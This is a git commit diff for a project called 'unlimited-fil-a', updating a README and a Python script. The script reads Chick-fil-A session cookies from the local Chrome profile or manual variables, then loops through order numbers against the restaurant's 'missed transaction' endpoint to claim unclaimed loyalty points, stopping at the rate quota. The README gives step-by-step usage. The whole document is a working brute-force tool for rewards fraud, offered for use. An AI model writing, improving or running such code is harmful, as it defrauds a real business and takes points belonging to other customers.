c2f2b3a0005261d44e6171deb884926f458287ca
Theo LEBRUN <mib.ftw@gmail.com>
2022-03-30 20:56:38 -0400

    Clean and update README

--- README.md
+++ README.md
@@ -1,13 +1,17 @@
 # unlimited-fil-a
 
-This python script reads the cookies from Chrome and then brute-force the "missed transaction" API to get unclaimed points.
+This python script reads the cookies from Chrome (or from local variables) and then brute-force the "missed transaction" API to get unclaimed points.
 
 # Usage
 
-- Login to https://www.chick-fil-a.com/ with Chrome
+- Login to https://www.chick-fil-a.com/ with Chrome or set the variables `asp_net_cookie` and `crn_token`
 - Edit `main.py` and update `DATE`, `ORDER_NUMBER` and `RESTAURANT_NUMBER` with the correct values
 - Run `python main.py`
-- The script will stop after the quota of API calls is reached (the quota is lifted after 1 month usually)
+- The script will stop after the quota of API calls is reached (usually 5 matches)
+- The quota is lifted after 1 month
+- Your transaction history should look like that after running the script:
+
+![transactions](https://raw.githubusercontent.com/Falydoor/unlimited-fil-a/main/transactions.png)
 
 # Help
 
--- main.py
+++ main.py
@@ -1,37 +1,60 @@
 import browser_cookie3
 import requests
+import os
+import logging
 from bs4 import BeautifulSoup
 
-DATE = '06/14/2021'
-ORDER_NUMBER = 1375222
-RESTAURANT_NUMBER = '04161'
-MATCHES = 0
+logging.basicConfig(level=logging.INFO)
+order_date = '03/30/2022'
+order_number = 1
+restaurant_number = '04161'
+match_count = 0
 
-cookie_jar = browser_cookie3.chrome(domain_name='.chick-fil-a.com')
-cookies = {'.AspNet.Cookies': cookie_jar._cookies['.chick-fil-a.com']['/']['.AspNet.Cookies'].value,
-           'Crn.TokenInformation': cookie_jar._cookies['.chick-fil-a.com']['/']['Crn.TokenInformation'].value}
-# cookies = {
-#     '.AspNet.Cookies': '',
-#     'Crn.TokenInformation': ''}
+# Set manual cookies here
+asp_net_cookie = ''
+crn_token = ''
 
-while ORDER_NUMBER < 9999999:
-    print(ORDER_NUMBER)
-    data = {'RestaurantNumber': RESTAURANT_NUMBER,
-            'Date': DATE,
-            'OrderNumber': ORDER_NUMBER,
+# Use manual cookies or Chrome cookies if empty
+if asp_net_cookie and crn_token:
+    logging.info('Manual cookie')
+    cookies = {
+        '.AspNet.Cookies': asp_net_cookie,
+        'Crn.TokenInformation': crn_token}
+else:
+    logging.info('Chrome cookie')
+    cookie_jar = browser_cookie3.chrome(
+        cookie_file=f"{os.getenv('HOME')}/Library/Application Support/Google/Chrome/Profile 1/Cookies",
+        domain_name='.chick-fil-a.com')
+    cookies = {'.AspNet.Cookies': cookie_jar._cookies['.chick-fil-a.com']['/']['.AspNet.Cookies'].value,
+               'Crn.TokenInformation': cookie_jar._cookies['.chick-fil-a.com']['/']['Crn.TokenInformation'].value}
+
+while True:
+    logging.info('Checking order %i', order_number)
+
+    # Fill form data
+    data = {'RestaurantNumber': restaurant_number,
+            'Date': order_date,
+            'OrderNumber': order_number,
             'OrderTotal': 15.00}
-    ORDER_NUMBER += 1
-    r = requests.post(
-        'https://www.chick-fil-a.com/missedtransaction', data=data, cookies=cookies)
+
+    # Sends POST request and parse HTML response
+    r = requests.post('https://www.chick-fil-a.com/missedtransaction', data=data, cookies=cookies)
+    html = BeautifulSoup(r.text, 'html.parser')
+
     # with open("debug.html", "w") as f:
     #     f.write(r.text)
-    html = BeautifulSoup(r.text, 'html.parser')
+
     if html.find_all('h3', string='Success!'):
-        print('MATCH FOUND, FREE POINTS!')
-        MATCHES += 1
+        # Match found
+        logging.info('Match found, points added!')
+        match_count += 1
     elif 'missed' in html.find_all('p', attrs={'role': 'alert'})[0].text:
-        print('QUOTA REACHED')
-        print(f'MATCHES : {MATCHES}')
+        # Quota reached
+        logging.info('Quota reached!')
+        logging.info('Matches total %i', match_count)
         break
     else:
-        print('NO MATCH FOUND')
+        logging.info('No match found')
+
+    # Increment order number
+    order_number += 1
